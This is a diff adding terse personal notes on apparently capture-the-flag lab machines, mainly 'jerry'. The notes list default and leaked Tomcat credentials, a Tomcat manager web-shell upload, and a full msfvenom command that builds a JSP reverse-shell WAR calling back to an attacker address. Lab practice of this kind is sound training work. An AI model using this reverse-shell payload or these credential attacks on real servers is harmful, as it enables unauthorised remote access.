@@ -126,3 +126,17 @@ privesc : sometimes inside meterpreter "getsystem" is enough lol ( not here)
 ### undisclosed machine
 
 privesc  : sudo -l  .  nano file import
+
+### jerry
+
+weak password
+*admin:admin* for status viewer. 
+
+error on other paths:
+<user username="tomcat" password="s3cret">  is actual pass   . Tomcat manager web shell upload.
+
+Java server pages web shell
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.26 LPORT=4444 -f war >shell.war
+
+### Nibbler
